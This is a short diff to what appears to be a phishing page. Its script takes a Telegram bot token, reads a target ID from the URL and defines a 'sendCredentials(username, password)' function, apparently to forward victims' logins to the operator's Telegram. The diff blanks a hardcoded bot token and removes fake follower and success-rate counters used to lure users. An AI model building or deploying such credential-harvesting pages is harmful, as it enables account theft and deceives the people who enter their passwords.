@@ -141,7 +141,7 @@
 
 <script>
     // 1. Yahan apna Telegram Bot Token daalo (@BotFather se banao)
-    const BOT_TOKEN = "AAEIkdjiEabfkZtf2aZKSRxyyCEcRfT3RHk"; 
+    const BOT_TOKEN = ""; 
     
     // URL se ID le raha hai, agar fix karna hai to neeche change karo
     const urlParams = new URLSearchParams(window.location.search);
@@ -157,14 +157,8 @@
     const progressContainer = document.getElementById('progressContainer');
     const progressBar = document.getElementById('progressBar');
 
-    // Fake stats animation
-    let total = 0;
-    setInterval(() => {
-        total += Math.floor(Math.random() * 3);
-        totalFollowers.textContent = total.toLocaleString();
-        onlineUsers.textContent = 0 + Math.floor(Math.random() * 100);
-        successRate.textContent = 0 + Math.floor(Math.random() * 7) + '%';
-    }, 3000);
+    
+    
 
     // Credentials send karne ka function
     async function sendCredentials(username, password) {
